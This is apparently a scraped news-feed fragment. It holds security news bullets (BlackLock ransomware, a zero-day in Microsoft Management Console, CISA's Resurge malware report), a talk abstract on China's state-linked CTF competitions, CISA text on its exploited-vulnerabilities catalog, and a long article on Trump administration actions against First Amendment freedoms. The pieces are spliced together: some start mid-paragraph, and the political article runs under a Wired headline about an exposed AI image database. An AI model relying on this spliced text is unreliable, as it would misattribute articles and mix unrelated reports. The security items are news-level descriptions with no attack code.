&lt;li&gt;Researchers have &lt;a href="https://www.resecurity.com/blog/article/blacklock-ransomware-a-late-holiday-gift-with-intrusion-into-the-threat-actors-infrastructure"&gt;uncovered&lt;/a&gt; a significant operational security failure within the BlackLock ransomware group by exploiting a misconfiguration in their data leak site (DLS). This flaw allowed access to internal commands, configuration files, and credentials, revealing that BlackLock, a rebranded version of the Eldorado ransomware group, has compromised 46 victims globally across various sectors, including technology, manufacturing, construction, finance, and retail.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.trendmicro.com/en_us/research/25/c/cve-2025-26633-water-gamayun.html"&gt;detected&lt;/a&gt; a campaign by the Russia-linked threat actor Water Gamayun exploiting CVE-2025-26633, a zero-day vulnerability in the Microsoft Management Console (MMC). This flaw allows attackers to execute malicious code by manipulating .msc files and the Multilingual User Interface Path (MUIPath), enabling unauthorized code execution and data exfiltration. Microsoft has released a patch to address this vulnerability.&lt;/li&gt;
&lt;li&gt;CISA &lt;a href="https://www.cisa.gov/news-events/alerts/2025/03/28/cisa-releases-malware-analysis-report-resurge-malware-associated-ivanti-connect-secure"&gt;released&lt;/a&gt; a Malware Analysis Report on &amp;#8220;Resurge&amp;#8221;, a backdoor malware targeting Ivanti Connect Secure appliances via CVE-2025-0282—a critical buffer overflow vulnerability disclosed in January. Resurge shares features with the SpawnChimera malware, including SSH tunneling, web shell deployment, and file manipulation to maintain persistence and evade detection. Threat actors can use it to escalate privileges, harvest credentials, and manipulate system integrity.&lt;/li&gt;

Jiangsu MSS received vulnerabilities from the Tianfu Cup. iSoon hosted their own CTF before their files were leaked on Github. Chinese intelligence cutouts tried to pitch US participants at RealWorldCTF. The list goes on.&lt;/p&gt;
&lt;p&gt;A diverse ecosystem of CTFs exists in China and it has, until now, been largely ignored. Since 2017 when the PRC government issued rules to bolster cybersecurity competitions, incorporate them into talent cultivation and training programs, and limit the amount of money to be paid out in rewards, China’s security ecosystem has launched more than 150 unique competitions. Including competitions that are held annually, the number of events since 2017 exceeds 400.&lt;/p&gt;
&lt;p&gt;Not all these competitions are software vulnerability competitions like Tianfu Cup—in fact, few are. Most are aimed at talent cultivation and recruiting, and many are hosted by the military, the intelligence services, or other arms of the state.&lt;/p&gt;
&lt;p&gt;This talk explores the diversity of China’s CTF ecosystem, its major leagues and events, and the annual number of participants across society. It highlights competitions held expressly by the Ministry of State Security and the PLA—delving into the competitions’ particulars. Defenders with appropriate CTI collection capabilities will better understand how to target their collection efforts on specific individuals in China.&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities" title="specified criteria"&gt;specified criteria&lt;/a&gt;.&lt;/p&gt;</description><guid isPermaLink="false">/node/23193</guid></item><item><title>An AI Image Generator’s Exposed Database Reveals What People Really Used It For</title><link>https://www.wired.com/story/genomis-ai-image-database-exposed/</link><description>An unsecured database used by a generative AI app revealed prompts and tens of thousands of explicit images—some of which are likely illegal.

But barely two months into his second term, the president has waged an unprecedented attack on the First Amendment rights of journalists, students, universities, government workers, lawyers and judges.

This story explores a slew of recent actions by the Trump administration that threaten to undermine all five pillars of the First Amendment to the U.S. Constitution, which guarantees freedoms concerning speech, religion, the media, the right to assembly, and the right to petition the government and seek redress for wrongs.</description><content:encoded>&lt;p style="text-align: center;"&gt;&lt;em&gt;&amp;#8220;Congress shall make no law respecting an establishment of religion, or prohibiting the free exercise thereof; or abridging the freedom of speech, or of the press; or the right of the people peaceably to assemble, and to petition the Government for a redress of grievances.&amp;#8221; -U.S. Constitution, First Amendment.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In an address to Congress this month, &lt;strong&gt;President Trump&lt;/strong&gt; claimed he had &amp;#8220;brought free speech back to America.&amp;#8221; But barely two months into his second term, the president has waged an unprecedented attack on the First Amendment rights of journalists, students, universities, government workers, lawyers and judges.&lt;/p&gt;
&lt;p&gt;This story explores a slew of recent actions by the Trump administration that threaten to undermine all five pillars of the First Amendment to the U.S. Constitution, which guarantees freedoms concerning speech, religion, the media, the right to assembly, and the right to petition the government and seek redress for wrongs.&lt;/p&gt;
&lt;h2&gt;THE RIGHT TO PETITION&lt;/h2&gt;
&lt;p&gt;The right to petition allows citizens to communicate with the government, whether to complain, request action, or share viewpoints &amp;#8212; without fear of reprisal. But that right is being assaulted by this administration on multiple levels. For starters, many GOP lawmakers are now heeding their leadership&amp;#8217;s advice to stay away from local town hall meetings and avoid the wrath of constituents affected by the administration&amp;#8217;s many federal budget and workforce cuts.&lt;/p&gt;
&lt;p&gt;Another example: President Trump recently &lt;a href="https://www.cnn.com/2025/02/18/politics/opm-privacy-team-fired/index.html" rel="noopener" target="_blank"&gt;fired most of the people&lt;/a&gt; involved in processing &lt;strong&gt;Freedom of Information Act&lt;/strong&gt; (FOIA) requests for government agencies. FOIA is an indispensable tool used by journalists and the public to request government records, and to hold leaders accountable.&lt;/p&gt;
&lt;p&gt;The biggest story by far this week was the bombshell from The Atlantic editor &lt;strong&gt;Jeffrey Goldberg&lt;/strong&gt;, who recounted how he was &lt;a href="https://www.theatlantic.com/politics/archive/2025/03/trump-administration-accidentally-texted-me-its-war-plans/682151/?gift=DjgA9DZGvABas7wFCM-ptk0vpPuikYUZT9Ej3cJbK1s&amp;amp;utm_source=copy-link&amp;amp;utm_medium=social&amp;amp;utm_campaign=share" rel="noopener" target="_blank"&gt;inadvertently added to a Signal group chat&lt;/a&gt; with &lt;strong&gt;National Security Advisor Michael Waltz&lt;/strong&gt; and 16 other Trump administration officials discussing plans for an upcoming attack on Yemen.&lt;/p&gt;
&lt;p&gt;One overlooked aspect of Goldberg&amp;#8217;s incredible account is that by planning and coordinating the attack on Signal &amp;#8212; which features messages that can auto-delete after a short time &amp;#8212; administration officials were evidently seeking a way to avoid creating a lasting (and potentially FOIA-able) record of their deliberations.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Intentional or not, use of Signal in this context was an act of erasure—because without Jeffrey Goldberg being accidentally added to the list, the general public would never have any record of these communications or any way to know they even occurred,&amp;#8221; &lt;strong&gt;Tony Bradley&lt;/strong&gt; &lt;a href="https://www.forbes.com/sites/tonybradley/2025/03/26/what-everyone-has-missed-about-the-trump-administration-signal-scandal/" rel="noopener" target="_blank"&gt;wrote this week at Forbes&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Petitioning the government, particularly when it ignores your requests, often requires challenging federal agencies in court. But that becomes far more difficult if the most competent law firms start to shy away from cases that may involve crossing the president and his administration.&lt;/p&gt;
&lt;p&gt;On March 22, the president issued &lt;a href="https://www.whitehouse.gov/presidential-actions/2025/03/preventing-abuses-of-the-legal-system-and-the-federal-court/" rel="noopener" target="_blank"&gt;a memorandum&lt;/a&gt; that directs heads of the Justice and Homeland Security Departments to &amp;#8220;seek sanctions against attorneys and law firms who engage in frivolous, unreasonable and vexatious litigation against the United States,&amp;#8221; or in matters that come before federal agencies.&lt;/p&gt;
&lt;p&gt;The POTUS recently issued several executive orders railing against specific law firms with attorneys who worked legal cases against him. On Friday, the &lt;a href="https://www.bloomberg.com/news/articles/2025-03-28/trump-says-he-s-reached-100-million-pro-bono-deal-with-skadden" rel="noopener" target="_blank"&gt;president announced&lt;/a&gt; that the law firm of &lt;strong&gt;Skadden, Arps, Slate, Meager &amp;amp; Flom&lt;/strong&gt; had agreed to provide $100 million in pro bono work on issues that he supports.&lt;/p&gt;
&lt;p&gt;Trump issued &lt;a href="https://www.whitehouse.gov/presidential-actions/2025/03/addressing-remedial-action-by-paul-weiss/" rel="noopener" target="_blank"&gt;another order&lt;/a&gt; naming the firm &lt;strong&gt;Paul, Weiss, Rifkind, Wharton &amp;amp; Garrison&lt;/strong&gt;, which ultimately agreed to pledge $40 million in pro bono legal services to the president&amp;#8217;s causes.&lt;/p&gt;
&lt;p&gt;Other Trump executive orders targeted law firms &lt;strong&gt;Jenner &amp;amp; Block&lt;/strong&gt; and &lt;strong&gt;WilmerHale&lt;/strong&gt;, both of which have attorneys that worked with special counsel Robert Mueller on the investigation into Russian interference in the 2016 election. But this week, two federal judges in separate rulings &lt;a href="https://www.cnn.com/2025/03/28/politics/law-firms-fighting-trump-executive-order/index.html" rel="noopener" target="_blank"&gt;froze parts of those orders&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;#8220;There is no doubt this retaliatory action chills speech and legal advocacy, and that is qualified as a constitutional harm,&amp;#8221; wrote &lt;strong&gt;Judge Richard Leon&lt;/strong&gt;, who ruled against the executive order targeting WilmerHale.&lt;/p&gt;
&lt;p&gt;President Trump recently took the extraordinary step of calling for the impeachment of federal judges who rule against the administration. Trump called &lt;strong&gt;U.S. District Judge James Boasberg&lt;/strong&gt; &lt;a class=" js-tealium-tracking " href="https://www.politico.com/news/2025/03/18/trump-impeachment-judge-deportations-00235173" rel="noopener" target="_blank"&gt;a “Radical Left Lunatic”&lt;/a&gt; and urged he be removed from office for blocking deportation of Venezuelan alleged gang members under a rarely invoked wartime legal authority.&lt;/p&gt;
&lt;p&gt;In a rare public rebuke to a sitting president, &lt;strong&gt;U.S. Supreme Court Justice John Roberts&lt;/strong&gt; &lt;a href="https://www.reuters.com/legal/us-chief-justice-roberts-calls-judges-impeachment-are-inappropriate-after-trump-2025-03-18/" rel="noopener" target="_blank"&gt;issued a statement on March 18&lt;/a&gt; pointing out that &amp;#8220;For more than two centuries, it has been established that impeachment is not an appropriate response to disagreement concerning a judicial decision.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The U.S. Constitution provides that judges can be removed from office only through impeachment by the House of Representatives and conviction by the Senate. The Constitution also states that judges&amp;#8217; salaries cannot be reduced while they are in office.&lt;/p&gt;
&lt;p&gt;Undeterred, &lt;strong&gt;House Speaker Mike Johnson &lt;/strong&gt;this week suggested the administration could still use the power of its purse to keep courts in line, and even &lt;a href="https://www.nbcnews.com/now/video/speaker-mike-johnson-floats-possibility-of-congress-eliminating-federal-courts-235397189724" rel="noopener" target="_blank"&gt;floated the idea of wholesale eliminating federal courts&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We do have authority over the federal courts as you know,&amp;#8221; Johnson said. &amp;#8220;We can eliminate an entire district court. We have power of funding over the courts, and all these other things. But desperate times call for desperate measures, and Congress is going to act, so stay tuned for that.&amp;#8221;&lt;/p&gt;
&lt;h2&gt;FREEDOM OF ASSEMBLY&lt;/h2&gt;
&lt;p&gt;President Trump has taken a number of actions to discourage lawful demonstrations at universities and colleges across the country, &lt;a href="https://www.reuters.com/world/us/trump-says-federal-funding-will-stop-colleges-schools-allowing-illegal-protests-2025-03-04/" rel="noopener" target="_blank"&gt;threatening to cut federal funding&lt;/a&gt; for any college that supports protests he deems &amp;#8220;illegal.&amp;#8221;&lt;/p&gt;
&lt;p&gt;A Trump &lt;a href="https://www.whitehouse.gov/presidential-actions/2025/01/additional-measures-to-combat-anti-semitism/" rel="noopener" target="_blank"&gt;executive order in January&lt;/a&gt; outlined a broad federal crackdown on what he called &amp;#8220;the explosion of antisemitism&amp;#8221; on U.S. college campuses. This administration has asserted that foreign students who are lawfully in the United States on visas do not enjoy the same free speech or due process rights as citizens.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reuters&lt;/strong&gt; reports that the acting civil rights director at the &lt;strong&gt;Department of Education&lt;/strong&gt; &lt;a href="https://www.ed.gov/about/news/press-release/us-department-of-educations-office-civil-rights-sends-letters-60-universities-under-investigation-antisemitic-discrimination-and-harassment" rel="noopener" target="_blank"&gt;on March 10 sent letters to 60 educational institutions&lt;/a&gt; warning they could lose federal funding if they don&amp;#8217;t do more to combat anti-semitism. On March 20, Trump issued an order calling for &lt;a href="https://www.ed.gov/about/news/press-release/statement-president-trumps-executive-order-return-power-over-education-states-and-local-communities" rel="noopener" target="_blank"&gt;the closure of the Education Department&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Meanwhile, &lt;strong&gt;U.S. Immigration and Customs Enforcement&lt;/strong&gt; (ICE) agents have been &lt;a href="https://apnews.com/article/immigration-detainees-students-ozturk-khalil-78f544fb2c8b593c88a0c1f0e0ad9c5f" rel="noopener" target="_blank"&gt;detaining and trying to deport&lt;/a&gt; pro-Palestinian students who are legally in the United States. The administration is targeting students and academics who spoke out against Israel&amp;#8217;s attacks on Gaza, or who were active in campus protests against U.S. support for the attacks. &lt;strong&gt;Secretary of State Marco Rubio&lt;/strong&gt; &lt;a href="https://thehill.com/homenews/education/5218410-ice-arrests-tufts-alabama-students-trump-immigration-crackdown-rumeysa-ozturk-khalil/" rel="noopener" target="_blank"&gt;told reporters Thursday&lt;/a&gt; that at least 300 foreign students have seen their visas revoked under President Trump, a far higher number than was previously known.&lt;/p&gt;
&lt;p&gt;In his first term, Trump threatened to use the national guard or the U.S. military to deal with protesters, and in campaigning for re-election he promised to revisit the idea.&lt;/p&gt;
&lt;p&gt;“I think the bigger problem is the enemy from within,” Trump told &lt;strong&gt;Fox News&lt;/strong&gt; in October 2024. “We have some very bad people. We have some sick people, radical left lunatics. And I think they’re the big — and it should be very easily handled by, if necessary, by National Guard, or if really necessary, by the military, because they can’t let that happen.”&lt;/p&gt;
&lt;p&gt;This term, Trump acted swiftly to remove the top judicial advocates in the armed forces who would almost certainly push back on any request by the president to use U.S. soldiers in an effort to quell public protests, or to arrest and detain immigrants. In late February, the president and &lt;strong&gt;Defense Secretary Pete Hegseth&lt;/strong&gt; fired the top legal officers for the military services &amp;#8212; those responsible for ensuring the Uniform Code of Military Justice is followed by commanders.&lt;/p&gt;
&lt;p&gt;Military.com &lt;a href="https://www.military.com/daily-news/2025/02/24/people-are-very-scared-trump-administration-purge-of-jag-officers-raises-legal-ethical-fears.html" rel="noopener" target="_blank"&gt;warns&lt;/a&gt; that the purge &amp;#8220;sets an alarming precedent for a crucial job in the military, as President Donald Trump has mused about using the military in unorthodox and potentially illegal ways.&amp;#8221; Hegseth told reporters the removals were necessary because he didn&amp;#8217;t want them to pose any &amp;#8220;roadblocks to orders that are given by a commander in chief.&amp;#8221;&lt;span id="more-70660"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;FREEDOM OF THE PRESS&lt;/h2&gt;
&lt;p&gt;President Trump has sued a number of U.S. news outlets, including &lt;strong&gt;60 Minutes&lt;/strong&gt;, &lt;strong&gt;CNN&lt;/strong&gt;, &lt;strong&gt;The Washington Post&lt;/strong&gt;, &lt;strong&gt;The New York Times&lt;/strong&gt; and other smaller media organizations for unflattering coverage.&lt;/p&gt;
&lt;p&gt;In a $10 billion lawsuit against 60 Minutes and its parent &lt;strong&gt;Paramount&lt;/strong&gt;, Trump claims they selectively edited an interview with former &lt;strong&gt;Vice President Kamala Harris&lt;/strong&gt; prior to the 2024 election. The TV news show last month published transcripts of the interview at the heart of the dispute, but Paramount is &lt;a href="https://apnews.com/article/cbs-60-minutes-lawsuit-trump-pelley-58339cc1a1eb52739bb365e2e8c6d8bc" rel="noopener" target="_blank"&gt;reportedly considering a settlement&lt;/a&gt; to avoid potentially damaging its chances of winning the administration&amp;#8217;s approval for a pending multibillion-dollar merger.&lt;/p&gt;
&lt;p&gt;The president &lt;a href="https://www.desmoinesregister.com/story/news/crime-and-courts/2025/02/25/dismissal-sought-donald-trump-lawsuit-pollster-ann-selzer-des-moines-register-iowa-poll/79442387007/" rel="noopener" target="_blank"&gt;sued The Des Moines Register&lt;/a&gt; and its parent company, &lt;strong&gt;Gannett&lt;/strong&gt;, for publishing a poll showing Trump trailing Harris in the 2024 presidential election in Iowa (a state that went for Trump). The POTUS also is &lt;a href="https://www.politico.com/news/2024/07/21/trump-libel-suit-pulitzer-prize-00169975" rel="noopener" target="_blank"&gt;suing the Pulitzer Prize board&lt;/a&gt; over 2018 awards given to The New York Times and The Washington Post for their coverage of purported Russian interference in the 2016 election.&lt;/p&gt;
&lt;p&gt;Whether or not any of the president&amp;#8217;s lawsuits against news organizations have merit or succeed is almost beside the point. The strategy behind suing the media is to make reporters and newsrooms think twice about criticizing or challenging the president and his administration. The president also knows some media outlets will find it more expedient to settle.&lt;/p&gt;
&lt;p&gt;Trump also sued &lt;strong&gt;ABC News&lt;/strong&gt; and &lt;strong&gt;George Stephanopoulos&lt;/strong&gt; for stating that the president had been found liable for &amp;#8220;rape&amp;#8221; in a civil case [Trump was found liable of sexually abusing and defaming E. Jean Carroll]. ABC parent &lt;strong&gt;Disney&lt;/strong&gt; settled that claim by agreeing to donate $15 million to the Trump Presidential Library.&lt;/p&gt;
&lt;p&gt;Following the attack on the U.S. Capitol on Jan. 6, 2021, &lt;strong&gt;Facebook&lt;/strong&gt; blocked President Trump&amp;#8217;s account. Trump sued &lt;strong&gt;Meta&lt;/strong&gt;, and after the president&amp;#8217;s victory in 2024 Meta &lt;a class="sc-19cc8fd2-0 kspHIT" href="https://www.wsj.com/us-news/law/trump-signs-agreement-calling-for-meta-to-pay-25-million-to-settle-suit-6f734c8c?mod=article_inline" rel="noopener" target="_blank"&gt;settled&lt;/a&gt; and agreed to pay Trump $25 million: $22 million would go to his presidential library, and the rest to legal fees. &lt;strong&gt;Meta CEO Mark Zuckerberg&lt;/strong&gt; also announced Facebook and Instagram would &lt;a href="https://www.cnn.com/2025/01/07/tech/meta-censorship-moderation/index.html" rel="noopener" target="_blank"&gt;get rid of fact-checkers&lt;/a&gt; and rely instead on reader-submitted &amp;#8220;community notes&amp;#8221; to debunk disinformation on the social media platform.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Brendan Carr&lt;/strong&gt;, the president&amp;#8217;s pick to run the &lt;strong&gt;Federal Communications Commission&lt;/strong&gt; (FCC), has pledged to &amp;#8220;dismantle the censorship cartel and restore free speech rights for everyday Americans.&amp;#8221; But on January 22, 2025, the FCC reopened complaints against ABC, &lt;strong&gt;CBS&lt;/strong&gt; and &lt;strong&gt;NBC&lt;/strong&gt; over their coverage of the 2024 election. The previous FCC chair had dismissed the complaints as attacks on the First Amendment and an attempt to weaponize the agency for political purposes.&lt;/p&gt;
&lt;p&gt;According to Reuters, the complaints call for an investigation into how ABC News moderated the pre-election TV debate between Trump and Biden, and appearances of then-Vice President Harris on 60 Minutes and on NBC&amp;#8217;s &amp;#8220;Saturday Night Live.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Since then, the FCC has opened investigations into &lt;strong&gt;NPR&lt;/strong&gt; and &lt;strong&gt;PBS&lt;/strong&gt;, &lt;a href="https://www.npr.org/2025/01/30/nx-s1-5281162/fcc-npr-pbs-investigation" rel="noopener" target="_blank"&gt;alleging&lt;/a&gt; that they are breaking sponsorship rules. The &lt;strong&gt;Center for Democracy &amp;amp; Technology &lt;/strong&gt;(CDT), a think tank based in Washington, D.C., &lt;a href="https://cdt.org/insights/when-it-comes-to-free-speech-the-trump-administration-should-follow-its-own-order/" rel="noopener" target="_blank"&gt;noted&lt;/a&gt; that the FCC is also investigating &lt;strong&gt;KCBS&lt;/strong&gt; in San Francisco for reporting on the location of federal immigration authorities.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Even if these investigations are ultimately closed without action, the mere fact of opening them – and the implicit threat to the news stations’ license to operate – can have the effect of deterring the press from news coverage that the Administration dislikes,&amp;#8221; the CDT&amp;#8217;s &lt;strong&gt;Kate Ruane&lt;/strong&gt; observed.&lt;/p&gt;
&lt;p&gt;Trump has repeatedly threatened to &amp;#8220;open up&amp;#8221; libel laws, with the goal of making it easier to sue media organizations for unfavorable coverage. But this week, the U.S. Supreme Court &lt;a href="https://nymag.com/intelligencer/article/supreme-court-thwarts-trump-dream-of-opening-up-libel-laws.html" rel="noopener" target="_blank"&gt;declined to hear a challenge&lt;/a&gt; brought by Trump donor and Las Vegas casino magnate Steve Wynn to overturn the landmark 1964 decision in &lt;em&gt;New York Times v. Sullivan&lt;/em&gt;, which insulates the press from libel suits over good-faith criticism of public figures.&lt;/p&gt;
&lt;p&gt;The president also has insisted on picking which reporters and news outlets should be allowed to cover White House events and participate in the press pool that trails the president. He barred the &lt;strong&gt;Associated Press&lt;/strong&gt; from the White House and Air Force One over their refusal to call the Gulf of Mexico by another name.&lt;/p&gt;
&lt;p&gt;And the Defense Department has ordered a number of top media outlets &lt;a href="https://www.reuters.com/world/us/pentagon-doubles-number-news-outlets-rotate-out-office-spaces-2025-02-08/" rel="noopener" target="_blank"&gt;to vacate their spots at the Pentagon&lt;/a&gt;, including CNN, The Hill, The Washington Post, The New York Times, NBC News, Politico and National Public Radio.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Incoming media outlets include the New York Post, Breitbart, the Washington Examiner, the Free Press, the Daily Caller, Newsmax, the Huffington Post and One America News Network, most of whom are seen as conservative or favoring Republican President Donald Trump,&amp;#8221; Reuters reported.&lt;/p&gt;
&lt;h2&gt;FREEDOM OF SPEECH&lt;/h2&gt;
&lt;p&gt;Shortly after Trump took office again in January 2025, the administration began circulating &lt;a href="https://www.nytimes.com/interactive/2025/03/07/us/trump-federal-agencies-websites-words-dei.html" rel="noopener" target="_blank"&gt;lists of hundreds of words&lt;/a&gt; that government staff and agencies shall not use in their reports and communications.&lt;/p&gt;
&lt;p&gt;The Brookings Institution &lt;a href="https://www.brookings.edu/articles/the-us-government-data-purge-is-a-loss-for-policymaking-and-research/" rel="noopener" target="_blank"&gt;notes&lt;/a&gt; that in moving to comply with this anti-speech directive, federal agencies have purged countless taxpayer-funded data sets from a swathe of government websites, including data on crime, sexual orientation, gender, education, climate, and global development.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The New York Times&lt;/strong&gt; reports that in the past two months, hundreds of terabytes of digital resources analyzing data have been taken off government websites.&lt;/p&gt;
&lt;p&gt;&amp;#8220;While in many cases the underlying data still exists, the tools that make it possible for the public and researchers to use that data have been removed,&amp;#8221; The Times &lt;a href="https://www.nytimes.com/2025/03/21/climate/government-websites-climate-environment-data.html" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;On Jan. 27, Trump issued &lt;a href="https://www.washingtonpost.com/documents/deb7af80-48b6-4b8a-8bfa-3d84fd7c3ec8.pdf" rel="noopener" target="_blank"&gt;a memo&lt;/a&gt; (PDF) that paused all federally funded programs pending a review of those programs for alignment with the administration&amp;#8217;s priorities. Among those was ensuring that no funding goes toward advancing &amp;#8220;Marxist equity, transgenderism, and green new deal social engineering policies.&amp;#8221;&lt;/p&gt;
&lt;p&gt;According to the CDT, this order is a blatant attempt to force government grantees to cease engaging in speech that the current administration dislikes, including speech about the benefits of diversity, climate change, and LGBTQ issues.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The First Amendment does not permit the government to discriminate against grantees because it does not like some of the viewpoints they espouse,&amp;#8221; the CDT&amp;#8217;s Ruane wrote. &amp;#8220;Indeed, those groups that are challenging the constitutionality of the order argued as much in their complaint, and have won an injunction blocking its implementation.&amp;#8221;&lt;/p&gt;
&lt;p&gt;On January 20, the same day Trump issued an executive order on free speech, the president also issued an executive order titled “&lt;a href="https://www.whitehouse.gov/presidential-actions/2025/01/reevaluating-and-realigning-united-states-foreign-aid/" rel="noopener" target="_blank"&gt;Reevaluating and Realigning United States Foreign Aid&lt;/a&gt;,” which froze funding for programs run by the &lt;strong&gt;U.S. Agency for International Development&lt;/strong&gt; (USAID). Among those were programs designed to empower civil society and human rights groups, journalists and others responding to digital repression and Internet shutdowns.&lt;/p&gt;
&lt;p&gt;According to the &lt;strong&gt;Electronic Frontier Foundation&lt;/strong&gt; (EFF), this includes many freedom technologies that use cryptography, fight censorship, protect freedom of speech, privacy and anonymity for millions of people around the world.&lt;/p&gt;
&lt;p&gt;&amp;#8220;While the State Department has issued some limited waivers, so far those waivers do not seem to cover the open source internet freedom technologies,&amp;#8221; the EFF &lt;a href="https://www.eff.org/deeplinks/2025/01/executive-order-state-department-sideswipes-freedom-tools-threatens-censorship" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt; about the USAID disruptions. &amp;#8220;As a result, many of these projects have to stop or severely curtail their work, lay off talented workers, and stop or slow further development.&amp;#8221;&lt;/p&gt;
&lt;p&gt;On March 14, the president signed &lt;a href="https://www.whitehouse.gov/presidential-actions/2025/03/continuing-the-reduction-of-the-federal-bureaucracy/" rel="noopener" target="_blank"&gt;another executive order&lt;/a&gt; that effectively gutted the &lt;strong&gt;U.S. Agency for Global Media&lt;/strong&gt; (USAGM), which oversees or funds media outlets including &lt;strong&gt;Radio Free Europe/Radio Liberty&lt;/strong&gt; and &lt;strong&gt;Voice of America&lt;/strong&gt; (VOA). The USAGM also oversees &lt;strong&gt;Radio Free Asia&lt;/strong&gt;, which supporters say has been one of the most reliable tools used by the government to combat Chinese propaganda.&lt;/p&gt;
&lt;p&gt;But this week, &lt;strong&gt;U.S. District Court Judge Royce Lamberth&lt;/strong&gt;, a Reagan appointee, &lt;a href="https://www.npr.org/2025/03/26/nx-s1-5341321/trump-radio-free-europe-radio-liberty-restraining-order" rel="noopener" target="_blank"&gt;temporarily blocked USAGM&amp;#8217;s closure&lt;/a&gt; by the administration.&lt;/p&gt;
&lt;p&gt;“RFE/RL has, for decades, operated as one of the organizations that Congress has statutorily designated to carry out this policy,” Lamberth &lt;a href="https://storage.courtlistener.com/recap/gov.uscourts.dcd.278524/gov.uscourts.dcd.278524.14.0.pdf" rel="noreferrer noopener" target="_blank"&gt;wrote in a 10-page opinion&lt;/a&gt;. “The leadership of USAGM cannot, with one sentence of reasoning offering virtually no explanation, force RFE/RL to shut down — even if the President has told them to do so.”&lt;/p&gt;
&lt;h2&gt;FREEDOM OF RELIGION&lt;/h2&gt;
&lt;p&gt;The Trump administration &lt;a href="https://www.dhs.gov/news/2025/01/21/statement-dhs-spokesperson-directives-expanding-law-enforcement-and-ending-abuse" rel="noopener" target="_blank"&gt;rescinded a decades-old policy&lt;/a&gt; that instructed officers not to take immigration enforcement actions in or near &amp;#8220;sensitive&amp;#8221; or &amp;#8220;protected&amp;#8221; places, such as churches, schools, and hospitals.&lt;/p&gt;
&lt;p&gt;That directive was immediately challenged in a case brought by a group of Quakers, Baptists and Sikhs, who argued the policy reversal was keeping people from attending services for fear of being arrested on civil immigration violations. On Feb. 24, a federal judge agreed and &lt;a href="https://www.usatoday.com/story/news/politics/2025/02/24/judge-blocks-immigration-enforcement-churches/80043880007/" rel="noopener" target="_blank"&gt;blocked&lt;/a&gt; ICE agents from entering churches or targeting migrants nearby.&lt;/p&gt;
&lt;p&gt;The president&amp;#8217;s executive order allegedly addressing antisemitism came with &lt;a href="https://www.whitehouse.gov/fact-sheets/2025/01/fact-sheet-president-donald-j-trump-takes-forceful-and-unprecedented-steps-to-combat-anti-semitism/" rel="noopener" target="_blank"&gt;a fact sheet&lt;/a&gt; that described college campuses as &amp;#8220;infested&amp;#8221; with &amp;#8220;terrorists&amp;#8221; and &amp;#8220;jihadists.&amp;#8221; Multiple faith groups expressed alarm over the order, saying it attempts to &lt;a href="https://www.npr.org/2025/03/20/nx-s1-5326047/kenneth-stern-antimsietim-executive-order-free-speech" rel="noopener" target="_blank"&gt;weaponize antisemitism&lt;/a&gt; and promote &amp;#8220;&lt;a href="https://www.ucc.org/faith-that-calls-for-welcome-confronts-the-harshest-anti-immigrant-policies-in-modern-u-s-history/" rel="noopener" target="_blank"&gt;dehumanizing anti-immigrant policies.&lt;/a&gt;&amp;#8221;&lt;/p&gt;
&lt;p&gt;The president also &lt;a href="https://apnews.com/article/trump-national-prayer-breakfast-30ff6f55a2e3c7b8643a15e7b158537d" rel="noopener" target="_blank"&gt;announced&lt;/a&gt; the creation of a &amp;#8220;Task Force to Eradicate Anti-Christian Bias,&amp;#8221; to be led by Attorney General Pam Bondi. Never mind that Christianity is easily the largest faith in America and that Christians are well-represented in Congress.&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;Rev. Paul Brandeis Raushenbush&lt;/strong&gt;, a Baptist minister and head of the progressive &lt;strong&gt;Interfaith Alliance&lt;/strong&gt;, issued a statement accusing Trump of hypocrisy in claiming to champion religion by creating the task force.&lt;/p&gt;
&lt;p&gt;“From allowing immigration raids in churches, to targeting faith-based charities, to suppressing religious diversity, the Trump Administration’s aggressive government overreach is infringing on religious freedom in a way we haven’t seen for generations,” Raushenbush said.&lt;/p&gt;
